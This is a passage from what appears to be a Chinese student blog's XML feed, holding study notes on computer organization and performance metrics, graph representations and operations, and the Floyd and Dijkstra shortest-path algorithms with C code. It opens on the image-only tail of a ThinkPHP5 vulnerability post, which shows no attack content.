<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\9.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\10.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\11.png" alt></p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统的多级层次结构及性能指标</title>
    <url>/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>机器语言发展史和评价性能指标</p>
<span id="more"></span>
<h2 id="计算机系统的多级层次结构"><a href="#计算机系统的多级层次结构" class="headerlink" title="计算机系统的多级层次结构"></a>计算机系统的多级层次结构</h2><p>传统机器（用机器语言的机器）：执行二进制机器指令<br>微程序机器（微指令系统）：由硬件直接执行微指令<br>虚拟机器（汇编语言机器）：用汇编程序翻译成机器语言<br>虚拟机器（高级语言机器）：用编译程序翻译成汇编语言程序</p>
<p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905150539173.png" alt="image-20220905150539173"><br>下层是上层的基础，上层是下层的扩展</p>
<p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905151514376.png" alt="image-20220905151514376"></p>
<p>计算机组成原理的“透明”指的是看不见</p>
<h2 id="计算机的性能指标"><a href="#计算机的性能指标" class="headerlink" title="计算机的性能指标"></a>计算机的性能指标</h2><h3 id="存储器的性能指标"><a href="#存储器的性能指标" class="headerlink" title="存储器的性能指标"></a>存储器的性能指标</h3><p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905151938563.png" alt="image-20220905151938563"></p>
<h3 id="CPU的性能指标"><a href="#CPU的性能指标" class="headerlink" title="CPU的性能指标"></a>CPU的性能指标</h3><p>CPU主频：CPU内数字脉冲信号震荡的频率<br>CPU时钟周期：单位：微秒、纳秒<br>CPU主频（时钟频率）=$\frac{1}{CPU时钟周期}$，单位是赫兹Hz，主频越高，CPU越快<br>CPI：执行一条指令所需的时钟周期数（不同的指令，CPI不同。甚至相同的指令，CPI也可能有变化）<br>执行一条指令的耗时=CPI*CPU时钟周期</p>
<p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905153247868.png" alt="image-20220905153247868"></p>
<p>IPS：每秒执行多少条指令  IPS=$\frac{主频}{平均CPI}$，单位：KIPS、MIPS<br>FLOPS：每秒执行多少次浮点运算，单位：KFLOPS、MFLOPS、GFLOPS、TFLOPS</p>
<h3 id="系统整体的性能指标"><a href="#系统整体的性能指标" class="headerlink" title="系统整体的性能指标"></a>系统整体的性能指标</h3><p>数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）<br>吞吐量：指系统在单位时间内处理请求的数量<br>响应时间：指从用户向计算机发送一个请求到系统对该请求做出响应并获得他所需要的结果的等待时间</p>
<p>基准程序：跑分软件</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905154407701.png" alt><br><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/1.png" alt><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905154620242.png" alt></p>
]]></content>
      <categories>
        <category>计算机组成</category>
      </categories>
      <tags>
        <tag>计组概念</tag>
      </tags>
  </entry>
  <entry>
    <title>图的表示方法</title>
    <url>/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>邻接矩阵法、十字链表法、邻接表法、邻接多重表的定义以及代码实现的学习以及其之间的比较</p>
<span id="more"></span>
<h2 id="邻接矩阵法"><a href="#邻接矩阵法" class="headerlink" title="邻接矩阵法"></a>邻接矩阵法</h2><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806130207218.png" alt="image-20220806130207218"><br>有向图：出度为行中1的个数  入度为列中1的个数 。矩阵是行-&gt;列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100                      <span class="comment">//顶点数目最大值</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">    <span class="type">char</span> Vex[MaxVertexNum];                   <span class="comment">//顶点表</span></span><br><span class="line">    <span class="type">int</span> Edge[MaxVertexNum][MaxVertexNum];     <span class="comment">//邻接矩阵、边表  //因为数据为0，1，可以换为bool型</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;                        <span class="comment">//图当前的顶点数和边数/弧数</span></span><br><span class="line">&#125; MGraph</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806130727614.png" alt="image-20220806130727614"></p>
<p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806131031260.png" alt="image-20220806131031260"><br>使用宏定义常量表示无穷   #define INFINITY</p>
<h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><script type="math/tex; mode=display">
在n个顶点的图中，空间复杂度为O(n)+O(n^2)=O(|v|^2),|v|为顶点集的个数\\
所以空间复杂度与边数没有关系，更适合用于存储稠密图，因为无向图的邻接矩阵是对称矩阵，所以可以压缩为上三角矩阵进行存储</script><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806131810061.png" alt="image-20220806131810061"></p>
<h2 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h2><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806134053572.png" alt="image-20220806134053572"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表存储的图（顺序存储） </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"><span class="comment">//顶点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">	VertexType data;               <span class="comment">//顶点信息</span></span><br><span class="line">    ArcNode *first;                <span class="comment">//第一条边</span></span><br><span class="line">&#125;VNode,AdjList[MaxVertexNum];</span><br><span class="line"><span class="comment">//边</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> adjvex;                    <span class="comment">//边指向的结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">next</span>;</span>           <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="comment">//InfoType info;                //边权值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无向图边结点数量是2|E|，整体空间复杂度为O(|V|+2|E|)<br>有向图边结点数量是|E|，整体空间复杂度为O(|V|+|E|)<br>邻接表存储稀疏图<br>出度：遍历目标结点的链表<br>入度：遍历整个链表寻找指向目标结点的个数</p>
<h2 id="十字链表、邻接多重表"><a href="#十字链表、邻接多重表" class="headerlink" title="十字链表、邻接多重表"></a>十字链表、邻接多重表</h2><p>十字链表用于存储有向图<br>邻接多重表存储无向图</p>
<h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表<img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140152515.png" alt="image-20220806140152515"></h3><h3 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h3><p>邻接表存储无向图：每条边对于两份冗余数据，删除，删除顶点、边不方便<br><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140736457.png" alt="image-20220806140736457"><br><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140750826.png" alt="image-20220806140750826"><br>空间复杂度：O(|V|+|E|)</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806141213425.png" alt="image-20220806141213425"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>硬件及工作过程</title>
    <url>/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>初步了解硬件以及工作原理</p>
<span id="more"></span>
<h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><h3 id="主存储器"><a href="#主存储器" class="headerlink" title="主存储器"></a>主存储器</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905091641009.png" alt><br>数据在存储体内按地址存储，存储体由一个个存储单元构成<br>存储单元：每个存储单元存放一串二进制代码，每个地址对于一个存储单元<br>存储字(word)：存储单元中二进制代码的组合<br>存储字长：存储单元中二进制代码的位数<br>存储元：即存储二进制的电子元件，每个存储元可存1bit（通过电容实现)<br>MAR位数反映存储单元的个数——MAR=4位：总共有2^4^个存储单元<br>MDR位数=存储字长——MDR=16位：每个存储单元可存放16bit，一个字(word)=16bit<br>注意：一个字节(Byte)=8bit，1B=一个字节，1b=1bit<br>100Mbps约等于10MB/s</p>
<h3 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905092645725.png" alt></p>
<h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905092949667.png" alt></p>
<p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905093207919.png" alt></p>
<h3 id="计算机的工作过程"><a href="#计算机的工作过程" class="headerlink" title="计算机的工作过程"></a>计算机的工作过程</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905093247087.png" style="zoom:80%;"><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905093330885-16633217362011.png" alt><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905094001033.png" alt><br>000001：取数指令<br>000010：存数指令<br>000011：加法指令<br>000100：乘法指令<br>000110：停机</p>
<p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905095420225.png" alt></p>
]]></content>
      <categories>
        <category>计算机组成</category>
      </categories>
      <tags>
        <tag>计组概念</tag>
      </tags>
  </entry>
  <entry>
    <title>图的基本操作</title>
    <url>/2022/08/22/%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>图的几个基本操作函数总结</p>
<span id="more"></span>
<h2 id="图的基本操作"><a href="#图的基本操作" class="headerlink" title="图的基本操作"></a>图的基本操作</h2><h3 id="Adjacent-G-x-y"><a href="#Adjacent-G-x-y" class="headerlink" title="Adjacent(G,x,y)"></a>Adjacent(G,x,y)</h3><p>判断图G是否存在边<x,y>(x,y)<br>该操作邻接矩阵更合适</x,y></p>
<h3 id="Neighbors-G-x"><a href="#Neighbors-G-x" class="headerlink" title="Neighbors(G,x)"></a>Neighbors(G,x)</h3><p>列出图G与结点x邻接的边<br>该操作一般情况下邻接矩阵更合适</p>
<h3 id="InsertVertex-G-x"><a href="#InsertVertex-G-x" class="headerlink" title="InsertVertex(G,x)"></a>InsertVertex(G,x)</h3><p>在图G中插入顶点x<br>在邻接矩阵和邻接表中都是在最后插入新的数据</p>
<h3 id="DeleteVertex-G-x"><a href="#DeleteVertex-G-x" class="headerlink" title="DeleteVertex(G,x)"></a>DeleteVertex(G,x)</h3><p>从图G中删除顶点x<br>邻接矩阵：删除一个顶点之后，将对应的行和列重置为0，可以设置一个bool变量表示是一个空结点</p>
<h3 id="AddEdge-G-x-y"><a href="#AddEdge-G-x-y" class="headerlink" title="AddEdge(G,x,y)"></a>AddEdge(G,x,y)</h3><p>若无向边（x,y)或者有向边<x,y>不存在，则向图G中添加该边<br>邻接表可以使用头插法，时间复杂度为O(1)</x,y></p>
<h3 id="FirstNeighbor-G-x"><a href="#FirstNeighbor-G-x" class="headerlink" title="FirstNeighbor(G,x)"></a>FirstNeighbor(G,x)</h3><p>求图G中顶点x的第一个邻接点，若有则返回顶点号，没有返回-1</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>图</title>
    <url>/2022/08/22/%E5%9B%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>有向图无向图简单图多重图连通图强连通图子图的定义，以及图中顶点的度连通分量，边的权和图与树森林的关系和转化，特殊形态的图的学习</p>
<span id="more"></span>
<h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><h3 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205115991.png" alt><br>图的边集可以为空集，边集可以有方向也可以没方向</p>
<p><strong>图逻辑结构的应用</strong><br>微信好友关系     地铁站（顶点集）铁路</p>
<h3 id="无向图，有向图"><a href="#无向图，有向图" class="headerlink" title="无向图，有向图"></a>无向图，有向图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205427477.png" alt><br>无向图边集用（)  有向图边集用&lt;&gt;</p>
<h3 id="简单图、多重图"><a href="#简单图、多重图" class="headerlink" title="简单图、多重图"></a>简单图、多重图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205904593.png" alt></p>
<h3 id="顶点的度、入度、出度"><a href="#顶点的度、入度、出度" class="headerlink" title="顶点的度、入度、出度"></a>顶点的度、入度、出度</h3><p>无向图：<strong>顶点v的度</strong>是该顶点边的条数，记为TD(v)<br>有向图：<strong>顶点v的入度</strong>是以顶点v为终点的有向边的数目，记为ID(v)<br>              <strong>顶点v的出度</strong>是以顶点v为起点的有向边的数目，记为OD(v)<br>              <strong>顶点v的度</strong>等于入度和出度的和，即TD(v)=ID(v)+OD(v)</p>
<script type="math/tex; mode=display">
n个顶点，e条边\\无向图：\sum_{i=1}^{n}TD(v_i)=2e\\有向图：\sum_{i=1}^nID(v_i)=\sum_{i=1}^nOD(v_i)=e</script><h3 id="顶点-顶点的关系描述"><a href="#顶点-顶点的关系描述" class="headerlink" title="顶点-顶点的关系描述"></a>顶点-顶点的关系描述</h3><p>路径——顶点A到顶点E之间的一条路径是指顶点序列（A,B,C,D,E)<br>回路—— 第一个顶点和最后一个顶点相同的路径称为<strong>回路或者环</strong><br>简单路径——路径序列中顶点不重复出现的路径<br>简单回路——除第一个顶点和最后一个顶点外，其余顶点不重复出现<br>路径长度——路径上边的数目<br>点到点的距离——最短路径的长度（若不存在路径记为无穷）<br>无向图中，若从顶点v到顶点w有路径存在，则成v和w是连通的<br>有向图中，若从顶点v到顶点w和从顶点w到顶点v之间都有路径，则称这两个顶点是强连通的</p>
<h3 id="连通图、强连通图"><a href="#连通图、强连通图" class="headerlink" title="连通图、强连通图"></a>连通图、强连通图</h3><p>无向图：若图G任意两个顶点都是连通的，则称图G为连通图，否则为非连通图<br>有向图：若图G任何一对顶点都是强连通的，则称此图为强连通图</p>
<script type="math/tex; mode=display">
常见考点：对于n个顶点的无向图G，若G是连通图，则最少有n-1条边。\\若G是非连通图，则最多可能有C_{n-1}^2条边\\对于有n个顶点的有向图G，若G是强连通图，则最少有n条边（形成回路）</script><h3 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803223621217.png" alt></p>
<h3 id="连通分量"><a href="#连通分量" class="headerlink" title="连通分量"></a>连通分量</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803223755599.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803223815794.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803223952245.png" alt></p>
<h3 id="生成树、森林"><a href="#生成树、森林" class="headerlink" title="生成树、森林"></a>生成树、森林</h3><p>连通图的生成树是包含图中全部顶点的一个极小连通子图<br><img src="/2022/08/22/%E5%9B%BE/image-20220803224238846.png" alt><br>n个顶点应该有n-1条边<br>在非连通图中，连通分量的生成树构成了非连通图的生成森林<br><img src="/2022/08/22/%E5%9B%BE/image-20220803224538347.png" alt></p>
<h3 id="边的权、带权图-网"><a href="#边的权、带权图-网" class="headerlink" title="边的权、带权图/网"></a>边的权、带权图/网</h3><p>边的权：每条边都可以标上具用某种含义的数值，该数值称为该边的<strong>权值</strong>。<br>带权图/网：边上带有权值的图称为<strong>带权图</strong>，也称<strong>网</strong><br>带权路径长度：当图是带权图时，一条<strong>路径上所有边的权值之和</strong></p>
<h3 id="特殊形态的图"><a href="#特殊形态的图" class="headerlink" title="特殊形态的图"></a>特殊形态的图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803225437195.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803225522718.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803225858050.png" alt><br>树是连通图，有向树并不是强连通图</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>Floyd算法</title>
    <url>/2022/08/22/Floyd%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最短路径问题中求解带权图中各顶点间的最短路径<br><span id="more"></span></p>
<h2 id="最短路径问题——Floyd算法"><a href="#最短路径问题——Floyd算法" class="headerlink" title="最短路径问题——Floyd算法"></a>最短路径问题——Floyd算法</h2><p>使用动态规划思想，将问题的求解分为多个阶段</p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822162139905.png" alt></p>
<script type="math/tex; mode=display">
若允许在V_k进行中转\\\\
若A^{(k-1)}[i][j]>A^{k-1}[i][k]+A^{(k-1)}[k][j]\\\\
则A^{(k)}[i][j]=A^{(k-1)}[i][k]+A^{(k-1)}[k][j]\\\\
path^{(k)}[i][j]=k\\\\
否则A^{(k)}和path^{(k)}保持原值</script><p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163032743.png" alt></p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163208295.png" alt></p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163313451.png" alt></p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163320676.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//准备工作，初始化矩阵A(即邻接矩阵)和矩阵path</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++) &#123;    <span class="comment">//考虑以Vk作为中转点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;    <span class="comment">//遍历整个矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j])&#123;     <span class="comment">//以Vk作为中转点的路径更短</span></span><br><span class="line">                A[i][j]=A[i][k]+A[k][j];     <span class="comment">//更新最短路径长度</span></span><br><span class="line">                path[i][j]=k;                <span class="comment">//中转点</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度：O(|V|^3)\\
空间复杂度：O(|V|^2)</script><h4 id="Floyd算法实例"><a href="#Floyd算法实例" class="headerlink" title="Floyd算法实例"></a>Floyd算法实例</h4><p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164622091.png" alt><br>初始状态<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164556099.png" alt><br>允许V0中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164535721.png" alt><br>允许V1中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164803197.png" alt><br>允许V2中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165126097.png" alt></p>
<script type="math/tex; mode=display">
注意其中A[0][3]通过A[2]中转时:\\
A[0][3]=A[0][2]+A[2][3]已经考虑到了V_0->V_2->V_1->V_3的路程</script><p>允许V3中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165455969.png" alt><br>允许V4中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165812367.png" alt></p>
<h4 id="如何通过path矩阵寻找最短路径"><a href="#如何通过path矩阵寻找最短路径" class="headerlink" title="如何通过path矩阵寻找最短路径"></a>如何通过path矩阵寻找最短路径</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165717520.png" alt></h4><p>弗洛伊德算法可以用于负权值带权图，但无法解决带有负权回路的图，这种图可能没有最短路径，如：<img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822170209802.png" alt></p>
<p>总结<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822170311837.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra算法</title>
    <url>/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最短路径问题中带权图的单源最短路径问题的Dijkstra核心代码以实例<br><span id="more"></span></p>
<h2 id="最短路径算法——Dijkstra算法"><a href="#最短路径算法——Dijkstra算法" class="headerlink" title="最短路径算法——Dijkstra算法"></a>最短路径算法——Dijkstra算法</h2><p>BFS算法求单源最短路径只适用于无权图，或所有边的权值都相同的图</p>
<p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155010006.png" alt></p>
<p>循环遍历所有节点，找到还没确定最短路径且dist最小的顶点Vi，另final[i]=true,检查所有邻接自Vi的顶点，若其final值为false，则更新dist和path</p>
<p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155437661.png" style="zoom:80%;"><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155614936.png" style="zoom:80%;"><br><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822160001351.png" style="zoom:80%;"><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822160016525.png" style="zoom:80%;"></p>
<p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155802078.png" alt></p>
<script type="math/tex; mode=display">
伪代码实现：\\
初始：若从V_0开始，令final[0]=true;dist[0]=0;path[0]=-1。\\
其余顶点final[k]=false;dist[k]=arcs[0][k];path[k]=(arcs[0][k]==∞)?-1:0\\
n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且dist最小的顶点V_i，令final[i]=true。\\
并检查所有邻接自V_i的顶点，对于邻接自V_i的顶点V_j,若final[j]==false且dist[i]+arcs[i][j]<dist[j]\\
则令dist[j]=dist[i]+arcs[i][j];path[j]=i.(注：arcs[i][j]表示V_i到V_j的弧的权值)\\
时间复杂度：O(n^2)即O(|V|^2)</script><p>注意：Dijkstra算法不适用于有负权值的带权图</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822170311837-16611674133291.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>BFS算法——最短路径问题</title>
    <url>/2022/08/22/BFS%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最短路径问题中,BFS算法解决无权图的单源最短路径问题的代码实现<br><span id="more"></span></p>
